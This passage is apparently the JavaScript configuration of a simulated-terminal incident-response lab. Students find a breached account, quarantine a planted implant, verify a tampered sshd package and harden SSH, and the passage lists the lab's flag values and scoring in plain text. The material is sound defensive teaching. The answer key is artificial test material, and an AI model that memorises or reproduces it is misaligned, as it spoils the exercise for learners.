        // faillock -- PAM account lockout management (cmd6: find/lock the exploited account)
        'faillock': function(args, term, engine) {
            const userIdx = args.indexOf('--user');
            const user = userIdx >= 0 ? (args[userIdx + 1] || '') : '';
            const isReset = args.includes('--reset');

            if (!user) {
                return 'Usage: faillock [--user <username>] [--reset]\n  faillock --user rogue-ops       view failure record\n  faillock --user rogue-ops --reset  reset counter';
            }

            // Viewing any user's failure record -- award cmd6
            if (user && !isReset) {
                engine.awardFlag('cmd6');
                engine.config._accountLocked = true;

                if (user === 'rogue-ops') {
                    return `rogue-ops:\nWhen                Type  Source                                           Valid\n2026-04-10 23:44:01 RHOST 203.0.113.44                                      V\n2026-04-10 23:44:14 RHOST 203.0.113.44                                      V\n2026-04-10 23:44:28 RHOST 203.0.113.44                                      V\n2026-04-10 23:44:41 RHOST 203.0.113.44                                      V\n2026-04-10 23:44:51 RHOST 203.0.113.44                                      V\n\n5 failures recorded. Account is LOCKED (deny=5 from /etc/security/faillock.conf).`;
                }
                if (user === 'root') {
                    return `root:\nWhen                Type  Source                                           Valid\n2026-04-10 23:43:18 RHOST 203.0.113.44                                      V\n2026-04-10 23:43:29 RHOST 203.0.113.44                                      V\n2026-04-10 23:43:44 RHOST 203.0.113.44                                      V\n\n3 failures then auth succeeded at 23:43:58 UTC (password auth was enabled).`;
                }
                return `${user}:\n(no failures recorded)`;
            }

            if (isReset) {
                return ``;
            }

            return `Usage: faillock [--user <username>] [--reset]`;
        },

        // passwd -- account management (alternate path to cmd6 via lock)
        'passwd': function(args, term, engine) {
            const lockFlag = args.includes('-l');
            const unlockFlag = args.includes('-u');
            const statusFlag = args.includes('-S') || args.includes('--status');
            const user = args.find(a => !a.startsWith('-')) || '';

            if (lockFlag && user) {
                // passwd -l rogue-ops -- also awards cmd6
                engine.awardFlag('cmd6');
                engine.config._accountLocked = true;
                return `passwd: password expiry information changed.`;
            }

            if (statusFlag && user) {
                engine.awardFlag('cmd6');
                engine.config._accountLocked = true;
                if (user === 'rogue-ops') {
                    return `rogue-ops L 2026-04-11 0 99999 7 -1`;
                }
                return `${user} P 2026-04-08 0 99999 7 -1`;
            }

            if (unlockFlag && user) {
                return `passwd: password expiry information changed.`;
            }

            return `Usage: passwd [-l] [-u] [-S] [username]\n  -l  lock account\n  -S  status\n  passwd -l rogue-ops  to lock the breached account`;
        },

        // clamscan -- antivirus scan (cmd7: scan and quarantine the malware)
        'clamscan': function(args, term, engine) {
            // Detect the quarantine --move flag and recursive scan flag
            const hasR = args.some(a => a === '-r' || a === '--recursive');
            const hasI = args.some(a => a === '-i' || a === '--infected');
            const moveIdx = args.findIndex(a => a.startsWith('--move'));
            const hasMove = moveIdx >= 0;
            const quarDir = hasMove
                ? (args[moveIdx].includes('=') ? args[moveIdx].split('=')[1] : (args[moveIdx + 1] || '/var/quarantine'))
                : null;

            // Determine what directories are being scanned
            const scanTargets = args.filter(a => !a.startsWith('-') && !a.startsWith('/var/quarantine') && a !== quarDir);
            const scansTmp = scanTargets.some(t => t === '/tmp' || t === '/tmp/');
            const scansHome = scanTargets.some(t => t === '/home' || t === '/home/' || t === '/');
            const scansAll = !scanTargets.length || scanTargets.includes('/');

            // cmd7 fires when scanning /tmp or /home (or /) with --move and -r
            // Requirement: clamscan -r -i --move=/var/quarantine /tmp /home (or similar)
            // Walkthrough spec: TWO malware files detected --
            //   /tmp/cell-implant.py       Trojan.ShellScript-7
            //   /home/rogue-ops/.local/share/.beacon  PUA.Tool.NetCat-3
            if (hasR && hasMove && (scansTmp || scansHome || scansAll)) {
                engine.awardFlag('cmd7');
                engine.config._malwareQuarantined = true;

                // Update the simulated filesystem: move both malware files to quarantine
                const fs = engine.config.filesystem['/'].children;
                if (!fs.var.children.quarantine) {
                    fs.var.children.quarantine = { type: 'dir', children: {} };
                }
                // Move /tmp/cell-implant.py
                if (fs.tmp.children['cell-implant.py']) {
                    fs.var.children.quarantine.children['cell-implant.py'] = fs.tmp.children['cell-implant.py'];
                    delete fs.tmp.children['cell-implant.py'];
                }
                // Move /home/rogue-ops/.local/share/.beacon
                const shareDir = fs.home.children['rogue-ops'].children['.local'] &&
                                 fs.home.children['rogue-ops'].children['.local'].children.share;
                if (shareDir && shareDir.children['.beacon']) {
                    fs.var.children.quarantine.children['.beacon'] = shareDir.children['.beacon'];
                    delete shareDir.children['.beacon'];
                }

                return `/tmp/cell-implant.py: Trojan.ShellScript-7 FOUND\n/home/rogue-ops/.local/share/.beacon: PUA.Tool.NetCat-3 FOUND\n\n----------- SCAN SUMMARY -----------\nKnown viruses: 8632156\nEngine version: 0.103.8\nScanned directories: 2\nScanned files: ${scansAll ? 4821 : 247}\nInfected files: 2\nData read: 184.00 MB (ratio 1.82:1)\nTime: 4.321 sec (2 file(s) moved to /var/quarantine/)`;
            }

            // Non-recursive or no --move scan -- still useful but doesn't move the files
            if (hasR && !hasMove && (scansTmp || scansHome || scansAll)) {
                return `/tmp/cell-implant.py: Trojan.ShellScript-7 FOUND\n/home/rogue-ops/.local/share/.beacon: PUA.Tool.NetCat-3 FOUND\n\n----------- SCAN SUMMARY -----------\nInfected files: 2\nNote: No --move flag -- infected files NOT quarantined. Add --move=/var/quarantine to remove them.`;
            }

            // Single-file scan
            const singleFile = args.find(a => a.startsWith('/') && !a.startsWith('/var/quarantine'));
            if (singleFile && singleFile.includes('cell-implant')) {
                return `/tmp/cell-implant.py: Trojan.ShellScript-7 FOUND\n\n----------- SCAN SUMMARY -----------\nScanned files: 1\nInfected files: 1`;
            }
            if (singleFile && singleFile.includes('.beacon')) {
                return `/home/rogue-ops/.local/share/.beacon: PUA.Tool.NetCat-3 FOUND\n\n----------- SCAN SUMMARY -----------\nScanned files: 1\nInfected files: 1`;
            }

            // freshclam first (no scan target given)
            return `Usage: clamscan [options] [files or directories]\n  -r            recursive scan\n  -i            show only infected files\n  --move=<dir>  move infected files to this directory\nExample: clamscan -r -i --move=/var/quarantine /tmp /home`;
        },

        // freshclam -- update ClamAV signature database
        'freshclam': function(args, term, engine) {
            const verbose = args.includes('--verbose') || args.includes('-v');
            if (verbose) {
                return `ClamAV update process started at Sat Apr 11 02:15:00 2026\nConnecting to database.clamav.net\ndaily.cld: up to date (version: 27241, sigs: 2011432, f-level: 90)\nmain.cvd: up to date (version: 62, sigs: 6647427, f-level: 90)\nbytecode.cld: up to date\nDatabase updated (8658859 signatures) from database.clamav.net`;
            }
            return `daily.cld updated (version: 27241)\nmain.cvd: up to date\nbytecode.cld: up to date`;
        },

        // dpkg -- package management (cmd8: verify tampered package)
        'dpkg': function(args, term, engine) {
            const sub = args[0] || '';

            // dpkg -V <package> -- integrity check (cmd8: detects the tampered sshd binary)
            if (sub === '-V' || sub === '--verify') {
                const pkg = args[1] || '';
                engine.awardFlag('cmd8');

                if (pkg === 'openssh-server' || pkg === 'openssh-client' || pkg === '') {
                    // Report the tampered binary -- '5' means MD5 checksum mismatch.
                    // No 'c' flag: /usr/sbin/sshd is a binary, NOT a conffile.
                    // dpkg -V omits the type character for non-conffiles (shows space instead).
                    return `??5??????   /usr/sbin/sshd\n(package: openssh-server)\n\nField codes: ?=not verified, 5=MD5 checksum mismatch, S=file size differs, M=mode changed\n'5' on /usr/sbin/sshd means the binary does not match the checksum recorded at install time -- it was replaced or tampered with by the attacker.`;
                }
                return '';  // clean package
            }

            // dpkg -l -- list installed packages
            if (sub === '-l') {
                const filter = args[1] || '';
                if (!filter || filter === '*') {
                    return `Desired=Unknown/Install/Remove/Purge/Hold\n| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend\n||/ Name             Version                Architecture  Description\n+++-================-======================-==============-===========\nii  clamav           0.103.8+dfsg-0ubuntu0  amd64         anti-virus utility for Unix\nii  fail2ban         0.11.2-5               all           ban hosts causing multiple authentication errors\nii  iptables         1.8.7-1ubuntu5.2       amd64         administration tools for packet filtering\nii  openssh-server   1:8.9p1-3ubuntu0.6     amd64         secure shell (SSH) server\nii  ufw              0.36.1-4ubuntu0.1      all           program for managing a Netfilter firewall`;
                }
                if (filter.includes('openssh')) {
                    return `ii  openssh-client   1:8.9p1-3ubuntu0.6  amd64  secure shell (SSH) client\nii  openssh-server   1:8.9p1-3ubuntu0.6  amd64  secure shell (SSH) server`;
                }
                return `(no packages matching '${filter}')`;
            }

            // dpkg -s -- package status
            if (sub === '-s') {
                const pkg = args[1] || '';
                if (pkg === 'openssh-server') {
                    return `Package: openssh-server\nStatus: install ok installed\nPriority: optional\nSection: net\nInstalled-Size: 924\nMaintainer: Ubuntu Developers <ubuntu-devel-discuss@lists.ubuntu.com>\nArchitecture: amd64\nVersion: 1:8.9p1-3ubuntu0.6\nDepends: libaudit1 (>= 1:2.2.1), libc6 (>= 2.34), libcrypt1 (>= 1:4.1.0)\nDescription: secure shell (SSH) server, for secure access from remote machines`;
                }
                return `dpkg-query: package '${pkg}' is not installed and no information is available`;
            }

            // dpkg -L -- list files in package
            if (sub === '-L') {
                const pkg = args[1] || '';
                if (pkg === 'openssh-server') {
                    return `/.\n/etc\n/etc/ssh\n/etc/ssh/sshd_config\n/lib\n/lib/systemd\n/lib/systemd/system\n/lib/systemd/system/ssh.service\n/usr\n/usr/lib\n/usr/lib/openssh\n/usr/lib/openssh/sftp-server\n/usr/sbin\n/usr/sbin/sshd`;
                }
                return `dpkg-query: package '${pkg}' is not installed`;
            }

            // dpkg -S -- which package owns a file
            if (sub === '-S') {
                const file = args[1] || '';
                if (file.includes('sshd')) {
                    return `openssh-server: /usr/sbin/sshd`;
                }
                return `dpkg-query: no path found matching pattern ${file}`;
            }

            return `Usage: dpkg [options]\n  dpkg -V openssh-server    verify package integrity\n  dpkg -l                   list installed packages\n  dpkg -s openssh-server    show package status\n  dpkg -L openssh-server    list package files\n  dpkg -S /usr/sbin/sshd    find package owning a file`;
        },

        // apt -- package management frontend
        'apt': function(args, term, engine) {
            const sub = args[0] || '';

            if (sub === 'update') {
                return `Hit:1 http://archive.ubuntu.com/ubuntu jammy InRelease\nHit:2 http://archive.ubuntu.com/ubuntu jammy-updates InRelease\nHit:3 http://security.ubuntu.com/ubuntu jammy-security InRelease\nReading package lists... Done`;
            }

            if (sub === 'install') {
                const pkg = args.slice(1).join(' ');
                if (pkg.includes('openssh-server') && pkg.includes('--reinstall')) {
                    return `Reading package lists... Done\nBuilding dependency tree... Done\nThe following packages will be upgraded:\n  openssh-server\n1 upgraded, 0 newly installed.\nPreparing to unpack .../openssh-server_1%3a8.9p1-3ubuntu0.6_amd64.deb ...\nUnpacking openssh-server (1:8.9p1-3ubuntu0.6) ...\nSetting up openssh-server (1:8.9p1-3ubuntu0.6) ...\nProcessing triggers for man-db (2.10.2-1) ...\n\nReinstall complete. Run dpkg -V openssh-server to confirm integrity.`;
                }
                return `Reading package lists... Done\nBuilding dependency tree... Done\nPackage '${pkg}' is already the newest version.`;
            }

            if (sub === 'list' && args[1] === '--upgradable') {
                return `Listing... Done\n(no upgradable packages)`;
            }

            if (sub === 'show' || sub === 'search') {
                return `(apt ${sub} output -- package information)`;
            }

            return `Usage: apt [update|upgrade|install|remove|purge|list|show|search]\n  apt install --reinstall openssh-server  to restore the tampered package`;
        },

        // grep -- pattern filter
        'grep': function(args, term, engine) {
            const pattern = args.find(a => !a.startsWith('-') && !a.startsWith('/')) || '';
            const file = args.find(a => a.startsWith('/')) || '';

            if (file.includes('auth.log') || args.some(a => a.includes('auth'))) {
                const flat = args.join(' ');
                if (flat.includes('Accepted') || flat.includes('Failed') || flat.includes('Accept')) {
                    return `Apr 10 23:31:04 cell-071 sshd[7200]: Failed password for root from 203.0.113.44 port 41022 ssh2\nApr 10 23:31:09 cell-071 sshd[7200]: Failed password for root from 203.0.113.44 port 41022 ssh2\nApr 10 23:31:14 cell-071 sshd[7200]: Failed password for root from 203.0.113.44 port 41022 ssh2\nApr 10 23:44:31 cell-071 sshd[7201]: Failed password for rogue-ops from 203.0.113.44 port 41099 ssh2\nApr 10 23:44:51 cell-071 sshd[7201]: Failed password for rogue-ops from 203.0.113.44 port 41099 ssh2\nApr 11 01:52:03 cell-071 sshd[7209]: Accepted password for root from 203.0.113.44 port 41233 ssh2`;
                }
            }

            if (file.includes('sshd_config') || args.some(a => a.includes('sshd_config'))) {
                const content = engine.config.filesystem['/'].children.etc.children.ssh.children.sshd_config.content;
                if (!pattern) return content;
                return content.split('\n').filter(l => l.toLowerCase().includes(pattern.toLowerCase())).join('\n') || '(no match)';
            }

            return `[grep] runs against piped input; in this sim grep returns no output as a standalone invocation.`;
        },

        // cat -- output file contents
        'cat': function(args, term, engine) {
            const file = args.find(a => !a.startsWith('-')) || '';
            if (!file) return 'Usage: cat <file>';

            // Resolve common paths into the simulated filesystem
            const pathMap = {
                '~/notes.txt': '/home/operator/notes.txt',
                'notes.txt': '/home/operator/notes.txt',
                '/home/operator/notes.txt': '/home/operator/notes.txt',
                '/etc/ssh/sshd_config': '/etc/ssh/sshd_config',
                '/etc/iptables/rules.v4': '/etc/iptables/rules.v4',
                '/etc/security/faillock.conf': '/etc/security/faillock.conf',
                '/etc/passwd': '/etc/passwd',
                '/var/log/auth.log': '/var/log/auth.log',
                '/var/log/syslog': '/var/log/syslog',
                '/tmp/cell-implant.py': '/tmp/cell-implant.py',
                '/home/rogue-ops/.ssh/authorized_keys': '/home/rogue-ops/authorized_keys_path',
                '/home/rogue-ops/.bash_history': '/home/rogue-ops/bash_history_path'
            };

            const resolved = pathMap[file] || file;

            if (resolved === '/home/operator/notes.txt') {
                return engine.config.filesystem['/'].children.home.children.operator.children['notes.txt'].content;
            }
            if (resolved === '/etc/ssh/sshd_config') {
                return engine.config.filesystem['/'].children.etc.children.ssh.children.sshd_config.content;
            }
            if (resolved === '/etc/iptables/rules.v4') {
                return engine.config.filesystem['/'].children.etc.children.iptables.children['rules.v4'].content;
            }
            if (resolved === '/etc/security/faillock.conf') {
                return engine.config.filesystem['/'].children.etc.children.security.children['faillock.conf'].content;
            }
            if (resolved === '/etc/passwd') {
                return engine.config.filesystem['/'].children.etc.children.passwd.content;
            }
            if (resolved === '/var/log/auth.log') {
                return engine.config.filesystem['/'].children.var.children.log.children['auth.log'].content;
            }
            if (resolved === '/var/log/syslog') {
                return engine.config.filesystem['/'].children.var.children.log.children.syslog.content;
            }
            if (resolved === '/tmp/cell-implant.py') {
                const tmp = engine.config.filesystem['/'].children.tmp.children;
                if (tmp['cell-implant.py']) {
                    return tmp['cell-implant.py'].content;
                }
                return 'cat: /tmp/cell-implant.py: No such file or directory\n(File was moved to quarantine by clamscan.)';
            }
            if (file.includes('rogue-ops') && file.includes('authorized_keys')) {
                return engine.config.filesystem['/'].children.home.children['rogue-ops'].children['.ssh'].children['authorized_keys'].content;
            }
            if (file.includes('rogue-ops') && file.includes('.bash_history')) {
                return engine.config.filesystem['/'].children.home.children['rogue-ops'].children['.bash_history'].content;
            }

            // Delegate to BoxEngine default filesystem walker
            return null;
        },

        // nano / vim / vi -- editor (simulated: lets students edit sshd_config to harden it)
        'nano': function(args, term, engine) {
            return engine.config.commands['_editor'](args, term, engine);
        },
        'vim': function(args, term, engine) {
            return engine.config.commands['_editor'](args, term, engine);
        },
        'vi': function(args, term, engine) {
            return engine.config.commands['_editor'](args, term, engine);
        },

        // Internal editor handler shared by nano/vim/vi
        '_editor': function(args, term, engine) {
            const file = args.find(a => !a.startsWith('-')) || '';
            if (file.includes('sshd_config')) {
                // Simulate editing sshd_config to harden PermitRootLogin
                const fs = engine.config.filesystem['/'].children;
                const current = fs.etc.children.ssh.children.sshd_config.content;
                if (current.includes('PermitRootLogin yes')) {
                    // Apply the hardening change
                    fs.etc.children.ssh.children.sshd_config.content =
                        current.replace('PermitRootLogin yes', 'PermitRootLogin no')
                               .replace('PasswordAuthentication yes', 'PasswordAuthentication no');
                    return `[Editor simulation]\nChanged:\n  PermitRootLogin yes  ->  PermitRootLogin no\n  PasswordAuthentication yes  ->  PasswordAuthentication no\n\nFile saved: /etc/ssh/sshd_config\nRun: sshd -t && systemctl reload sshd  to apply changes.`;
                }
                if (current.includes('PermitRootLogin no')) {
                    return `[Editor simulation] /etc/ssh/sshd_config\nPermitRootLogin no  (already hardened)\nPasswordAuthentication no\nFile unchanged.`;
                }
            }
            if (file.includes('iptables') || file.includes('rules.v4')) {
                return `[Editor simulation] /etc/iptables/rules.v4\nEdit this file to set persistent firewall rules.\nOr use: iptables-save > /etc/iptables/rules.v4`;
            }
            return `[Editor simulation] Cannot open interactive editor in this terminal.\nTarget file: ${file || '(none specified)'}`;
        },

        // sed -- non-interactive file edit (alternate path to hardening sshd_config)
        'sed': function(args, term, engine) {
            const flat = args.join(' ');
            // sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
            if (flat.includes('PermitRootLogin') && flat.includes('sshd_config')) {
                const fs = engine.config.filesystem['/'].children;
                const current = fs.etc.children.ssh.children.sshd_config.content;
                if (current.includes('PermitRootLogin yes')) {
                    fs.etc.children.ssh.children.sshd_config.content =
                        current.replace('PermitRootLogin yes', 'PermitRootLogin no');
                    return '';  // sed is silent on success
                }
                return '';
            }
            return `sed: ${args.join(' ')}: (processed)`;
        },

        // ps -- process snapshot
        'ps': function(args, term, engine) {
            const flat = args.join('');
            const isEf = args.includes('-ef') || (args.includes('-e') && args.includes('-f'));
            const isAux = args.includes('aux') || args.includes('-aux');
            if (isEf || isAux) {
                const quarantined = engine.config._malwareQuarantined;
                const implantLine = quarantined
                    ? ''  // process gone after quarantine
                    : '\nroot        3142       1  0.1  0.3  Apr11 ?        00:00:12 python3 /tmp/cell-implant.py';
                if (isEf) {
                    return `UID          PID    PPID  C STIME TTY          TIME CMD\nroot           1       0  0 Apr11 ?        00:00:09 /sbin/init\nroot         433       1  0 Apr11 ?        00:00:02 /lib/systemd/systemd-networkd\nroot         842       1  0 Apr11 ?        00:00:01 sshd: /usr/sbin/sshd -D\noperator    1421     842  0 02:01 pts/0    00:00:00 -bash${implantLine}\noperator    1432    1421  0 02:14 pts/0    00:00:00 ps -ef`;
                }
                return `USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot           1  0.0  0.1 167872 11392 ?        Ss   Apr11   0:09 /sbin/init\nroot         842  0.0  0.1  17448  6912 ?        Ss   02:01   0:01 sshd: /usr/sbin/sshd -D\noperator    1421  0.0  0.1   8956  5120 pts/0    Ss   02:01   0:00 -bash${implantLine}`;
            }
            return `Usage: ps [-ef | aux]`;
        },

        // lastb -- failed login log (alternate to grep auth.log)
        'lastb': function(args, term, engine) {
            engine.awardFlag('cmd6');
            engine.config._accountLocked = true;
            return `rogue-ops ssh:notty 203.0.113.44      Fri Apr 10 23:44:51 - 23:44:51  (00:00)\nrogue-ops ssh:notty 203.0.113.44      Fri Apr 10 23:44:46 - 23:44:46  (00:00)\nrogue-ops ssh:notty 203.0.113.44      Fri Apr 10 23:44:41 - 23:44:41  (00:00)\nrogue-ops ssh:notty 203.0.113.44      Fri Apr 10 23:44:36 - 23:44:36  (00:00)\nrogue-ops ssh:notty 203.0.113.44      Fri Apr 10 23:44:31 - 23:44:31  (00:00)\nroot      ssh:notty 203.0.113.44      Fri Apr 10 23:31:14 - 23:31:14  (00:00)\nroot      ssh:notty 203.0.113.44      Fri Apr 10 23:31:09 - 23:31:09  (00:00)\nroot      ssh:notty 203.0.113.44      Fri Apr 10 23:31:04 - 23:31:04  (00:00)\n\nbtmp begins Fri Apr 10 23:31:04 2026`;
        },

        // last -- successful login log
        'last': function(args, term, engine) {
            return `root     pts/1        203.0.113.44     Sat Apr 11 01:52 - 01:52  (00:00)\noperator pts/0        10.0.0.1         Sat Apr 11 02:01   still logged in\n\nwtmp begins Thu Apr  8 09:00:00 2026`;
        },

        // who / w -- current users
        'who': function(args, term, engine) {
            return `operator pts/0        2026-04-11 02:01 (10.0.0.1)`;
        },

        // ls -- directory listing
        'ls': function(args, term, engine) {
            const longFlag = args.some(a => /^-[a-z]*l/.test(a));
            const allFlag = args.some(a => /^-[a-z]*a/.test(a));
            const path = args.find(a => !a.startsWith('-')) || '.';

            if (path === '/tmp' || path === '/tmp/') {
                const quarantined = engine.config._malwareQuarantined;
                if (quarantined) {
                    return longFlag ? 'total 0\ndrwxrwxrwt 2 root root  40 Apr 11 02:15 .\ndrwxr-xr-x 1 root root 100 Apr 11 02:01 ..' : '';
                }
                if (longFlag) {
                    return `total 4\ndrwxrwxrwt 2 root root   60 Apr 11 02:01 .\ndrwxr-xr-x 1 root root 4096 Apr 11 02:01 ..\n-rwxr-xr-x 1 root root  947 Apr 11 02:01 cell-implant.py`;
                }
                return 'cell-implant.py';
            }

            if (path === '/var/quarantine' || path === '/var/quarantine/') {
                const quarantined = engine.config._malwareQuarantined;
                if (quarantined) {
                    // Both malware files moved here after clamscan --move
                    if (longFlag) {
                        return `total 8\ndrwx------ 2 root root   80 Jun 15 04:47 .\ndrwxr-xr-x 1 root root  100 Jun 15 04:47 ..\n-rw------- 1 root root   64 Jun 15 04:47 .beacon\n-rwxr-xr-x 1 root root  947 Jun 15 04:47 cell-implant.py`;
                    }
                    return '.beacon  cell-implant.py';
                }
                return longFlag ? 'total 0\ndrwx------ 2 root root 40 Jun 15 04:47 .\ndrwxr-xr-x 1 root root 80 Jun 15 04:47 ..' : '';
            }

            // ls of the directory that held .beacon -- shows it gone after quarantine
            if (path === '/home/rogue-ops/.local/share' || path === '/home/rogue-ops/.local/share/') {
                const quarantined = engine.config._malwareQuarantined;
                if (quarantined) {
                    return longFlag ? 'total 0\ndrwx------ 2 rogue-ops rogue-ops 40 Jun 15 04:47 .\ndrwx------ 3 rogue-ops rogue-ops 60 Jun 15 04:47 ..' : '';
                }
                if (longFlag) {
                    return `total 4\ndrwx------ 2 rogue-ops rogue-ops  60 Jun 15 04:01 .\ndrwx------ 3 rogue-ops rogue-ops  80 Jun 15 04:01 ..\n-rw------- 1 rogue-ops rogue-ops  64 Jun 15 04:01 .beacon`;
                }
                return allFlag ? '.beacon' : '';
            }

            if (path.includes('clamav') || path === '/var/lib/clamav' || path === '/var/lib/clamav/') {
                if (longFlag) {
                    return `total 229M\ndrwxr-xr-x 2 clamav clamav 4.0K Apr 11 00:00 .\ndrwxr-xr-x 3 root   root   4.0K Apr  8 09:00 ..\n-rw-r--r-- 1 clamav clamav 243K Apr 11 00:00 bytecode.cld\n-rw-r--r-- 1 clamav clamav  67M Apr 11 00:00 daily.cld\n-rw-r--r-- 1 clamav clamav 162M Apr  8 09:00 main.cvd`;
                }
                return 'bytecode.cld  daily.cld  main.cvd';
            }

            // Delegate to BoxEngine default filesystem walker
            return null;
        },

        // rkhunter -- rootkit detection (bonus command for students who explore)
        'rkhunter': function(args, term, engine) {
            if (args.includes('--check')) {
                return `[ Rootkit Hunter version 1.4.6 ]\n\nChecking system commands...\n  Performing 'strings' command checks\n    Checking 'strings' command                          [ OK ]\n\nChecking for rootkits...\n  Performing check of known rootkit files and directories\n    55808 Trojan - Variant A                            [ Not found ]\n    ADM Worm                                            [ Not found ]\n\n  Performing filesystem checks\n  Checking /usr/sbin/sshd                               [ MODIFIED ]\n\nWarning: /usr/sbin/sshd has been modified (possible trojan replacement).\nRun: dpkg -V openssh-server  to verify package integrity.\n\nSystem checks summary\n=====================\nFile properties checks...\n    Files checked: 141\n    Suspect files: 1\n\nAll results have been written to the log file: /var/log/rkhunter.log`;
            }
            if (args.includes('--update')) {
                return `[ Rootkit Hunter version 1.4.6 ]\n\nChecking rkhunter data files...\n  Checking file mirrors.dat                             [ No update ]\n  Checking file programs_bad.dat                        [ No update ]\n  Checking file backdoorports.dat                       [ No update ]\n  Checking file suspscan.dat                            [ No update ]\n\nrkhunter data files are up to date.`;
            }
            if (args.includes('--propupd')) {
                return `[ Rootkit Hunter version 1.4.6 ]\nUpdated file properties.`;
            }
            return `Usage: rkhunter [--check] [--update] [--propupd] [--cronjob]\n  rkhunter --check  to run a full rootkit scan`;
        },

        // ping -- connectivity test
        'ping': function(args, term, engine) {
            const target = args.find(a => !a.startsWith('-')) || '';
            if (!target) return 'Usage: ping [-c count] <destination>';
            if (target === '127.0.0.1' || target === 'localhost') {
                return `PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.031 ms\n\n--- 127.0.0.1 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss`;
            }
            if (target === '203.0.113.44') {
                return `PING 203.0.113.44 (203.0.113.44) 56(84) bytes of data.\n64 bytes from 203.0.113.44: icmp_seq=1 ttl=54 time=82.3 ms\n\n--- 203.0.113.44 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss\n\n*** This is the attacker\'s C2 server. Block it with iptables -A INPUT -s 203.0.113.44 -j DROP ***`;
            }
            return `PING ${target} (${target}) 56(84) bytes of data.\n64 bytes from ${target}: icmp_seq=1 ttl=56 time=14.2 ms\n\n--- ${target} ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss`;
        },

        // journalctl -- system journal
        'journalctl': function(args, term, engine) {
            const flat = args.join(' ');
            if (flat.includes('sshd') || flat.includes('ssh')) {
                return `-- Journal begins at Sat 2026-04-11 02:01:44 UTC --\nApr 11 01:52:03 cell-071 sshd[7209]: Accepted password for root from 203.0.113.44 port 41233 ssh2\nApr 11 02:01:44 cell-071 sshd[7210]: Accepted publickey for operator from 10.0.0.1 port 52001 ssh2\nApr 11 02:01:44 cell-071 sshd[842]: Server listening on 0.0.0.0 port 22.\n\nHint: The root login at 01:52 used password auth -- disable with PermitRootLogin no, PasswordAuthentication no`;
            }
            return `-- Journal begins at Sat 2026-04-11 00:00:01 UTC --\nApr 11 02:01:01 cell-071 python3[3142]: cell-implant.py: started, C2=203.0.113.44:4444\nApr 11 02:03:14 cell-071 dpkg[9901]: WARNING: files list file for package openssh-server missing\nApr 11 02:14:00 cell-071 grid-security[999]: ALERT: anomalous outbound to 203.0.113.44:4444\n\nHint: journalctl -u ssh -n 30 for SSH-specific events`;
        },

        // ip -- network information (read-only here -- no interface changes needed)
        'ip': function(args, term, engine) {
            const sub = args[0] || '';
            if (sub === 'link' && args[1] === 'show') {
                return `1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 state UNKNOWN\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 state UP\n    link/ether 52:54:00:ab:11:01 brd ff:ff:ff:ff:ff:ff\n3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 state UP\n    link/ether 52:54:00:ab:11:02 brd ff:ff:ff:ff:ff:ff`;
            }
            if (sub === 'addr' || sub === 'address') {
                return `1: lo: <LOOPBACK,UP,LOWER_UP>\n    inet 127.0.0.1/8 scope host lo\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP>\n    inet 10.0.0.71/24 brd 10.0.0.255 scope global eth0\n3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP>\n    inet 10.0.1.71/24 brd 10.0.1.255 scope global eth1`;
            }
            return `Usage: ip [link|addr|route|neigh] [show]`;
        }
    },

    // ═══════════════════════════════════════════════════════
    // FLAGS
    // ═══════════════════════════════════════════════════════

    flags: [
        // One flag per scavenger hunt worksheet row. Auto-captured when the
        // student runs the corresponding command in the terminal.
        { id: 'cmd1', value: 'FLAG{ala-hunt2_cmd01_firewall_status}',   label: '01 -- Inspect firewall rules',      description: 'Ran iptables -L -n -v to audit current firewall state.',            points: 50, autoCheck: true },
        { id: 'cmd2', value: 'FLAG{ala-hunt2_cmd02_default_deny}',      label: '02 -- Set default-deny policy',    description: 'Ran iptables -P INPUT DROP (or ufw default deny incoming).',       points: 50, autoCheck: true },
        { id: 'cmd3', value: 'FLAG{ala-hunt2_cmd03_allow_ssh}',         label: '03 -- Allow only SSH inbound',     description: 'Added iptables rule for port 22 ACCEPT (or ufw allow 22/tcp).',   points: 50, autoCheck: true },
        { id: 'cmd4', value: 'FLAG{ala-hunt2_cmd04_rogue_port}',        label: '04 -- Find the rogue open port',   description: 'Ran ss -tlnp to identify the unexpected listening port (8888).',   points: 50, autoCheck: true },
        { id: 'cmd5', value: 'FLAG{ala-hunt2_cmd05_harden_ssh}',        label: '05 -- Harden SSH config + reload', description: 'Set PermitRootLogin no in sshd_config then reloaded sshd.',        points: 50, autoCheck: true },
        { id: 'cmd6', value: 'FLAG{ala-hunt2_cmd06_lock_account}',      label: '06 -- Audit the exploited account',description: 'Ran faillock --user rogue-ops (or lastb / passwd -l rogue-ops).', points: 50, autoCheck: true },
        { id: 'cmd7', value: 'FLAG{ala-hunt2_cmd07_av_scan}',           label: '07 -- Scan and quarantine malware',description: 'Ran clamscan -r -i --move=/var/quarantine /tmp /home.',             points: 50, autoCheck: true },
        { id: 'cmd8', value: 'FLAG{ala-hunt2_cmd08_dpkg_verify}',       label: '08 -- Detect tampered package',    description: 'Ran dpkg -V openssh-server to verify package integrity.',          points: 50, autoCheck: true }
    ],

    // ═══════════════════════════════════════════════════════
    // SCORING
    // ═══════════════════════════════════════════════════════

    scoring: {
        // base:0 so 8 flags x 50pts = 400 on completion, matching the walkthrough.
        // W1 uses base:1000 with 13 flags; W2 uses base:0 with 8 flags -- both
        // produce a displayed total equal to the flag-points sum stated in the walkthrough.
        base: 0,
        minScore: 0,
        maxScore: 400,
        hintPenalty: true,
        wrongFlagPenalty: -25,
        speedBonus: { threshold: 900000, points: 100 },
        timeBonusThreshold: 1800
    },

    // ═══════════════════════════════════════════════════════
    // HINTS
    // ═══════════════════════════════════════════════════════

    hints: [
        {
            id: 'hint1',
